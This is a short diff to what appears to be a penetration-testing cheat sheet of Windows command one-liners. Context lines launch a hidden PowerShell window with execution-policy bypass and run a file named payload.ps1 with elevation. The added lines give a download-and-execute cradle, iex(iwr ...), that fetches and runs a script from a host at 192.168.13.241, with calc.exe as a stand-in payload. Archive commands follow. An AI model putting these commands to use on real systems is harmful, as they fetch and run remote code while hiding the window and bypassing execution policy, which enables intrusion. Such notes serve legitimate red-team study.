@@ -7,6 +7,10 @@ cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Fil
 # Exec PS1 File as Administrator
 powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Users\u101\payload.ps1' -Verb RunAs"
 
+# Download and Exec
+iex(iwr -Uri http://192.168.13.241/calc.ps1 -UseBasicParsing)
+// cmd.exe /c calc.exe > calc.ps1
+
 # Zip and Unzip
 powershell Compress-Archive C:\Users\u101\file1 C:\Users\u101\file1.zip
 powershell expand-archive C:\Users\u101\file1.zip C:\Users\u101\file1
